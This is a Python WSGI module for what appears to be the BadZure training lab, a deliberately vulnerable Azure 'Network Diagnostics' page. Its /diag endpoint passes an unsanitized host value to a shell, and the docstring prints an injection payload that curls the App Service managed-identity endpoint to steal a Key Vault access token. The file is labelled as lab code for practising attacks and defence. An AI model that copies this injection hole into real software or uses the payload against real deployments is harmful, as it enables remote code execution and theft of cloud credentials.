"""
BadZure intentionally-vulnerable web app — "Ops / Network Diagnostics" dashboard.

A single stdlib-only WSGI module (no requirements.txt) exposing the standard
`app(environ, start_response)` callable, served by the App Service Linux Python
image's preinstalled gunicorn (default startup `gunicorn ... app:app`). Because the
zip carries no dependencies, the deploy has nothing to build and cannot fail on
dependency resolution.

THE PLANTED VULNERABILITY (command injection / RCE):
  GET /diag?host=<h>  runs `ping -c 1 <h>` via subprocess with shell=True and an
  UNSANITIZED host value, so a payload like `127.0.0.1; <command>` executes
  arbitrary commands in the app's process context — where the App Service managed
  identity env vars (IDENTITY_ENDPOINT + IDENTITY_HEADER) live. One injected request
  reads those and fetches the MSI token:

    /diag?host=127.0.0.1; curl -s \
      "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" \
      -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

This is deliberately insecure lab/training code. Do NOT reuse it anywhere real.
"""
import html
import subprocess
from urllib.parse import parse_qs


_PAGE = """<!doctype html>
<html>
<head><title>Ops &middot; Network Diagnostics</title></head>
<body style="font-family: sans-serif; max-width: 640px; margin: 3rem auto;">
  <h2>Network Diagnostics</h2>
  <p>Internal tool &mdash; ping a host to check reachability.</p>
  <form action="/diag" method="get">
    <input name="host" placeholder="hostname or IP" style="padding:.4rem;width:18rem;">
    <button type="submit" style="padding:.4rem .8rem;">Ping</button>
  </form>
  {result}
</body>
</html>"""


def _render(result_html=""):
    return _PAGE.format(result=result_html).encode("utf-8")


def _diag(host):
    # VULNERABLE ON PURPOSE: shell=True with an unsanitized host -> command injection.
    cmd = "ping -c 1 " + host
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                      timeout=10)
        text = out.decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        text = e.output.decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001 — lab tool, surface anything to the page
        text = str(e)
    return "<h3>Result</h3><pre style='background:#f4f4f4;padding:1rem;'>{}</pre>".format(
        html.escape(text))


def app(environ, start_response):
    path = environ.get("PATH_INFO", "/")
    if path == "/diag":
        params = parse_qs(environ.get("QUERY_STRING", ""))
        host = params.get("host", [""])[0]
        body = _render(_diag(host) if host else "")
    else:
        body = _render()
    start_response("200 OK", [("Content-Type", "text/html; charset=utf-8"),
                              ("Content-Length", str(len(body)))])
    return [body]
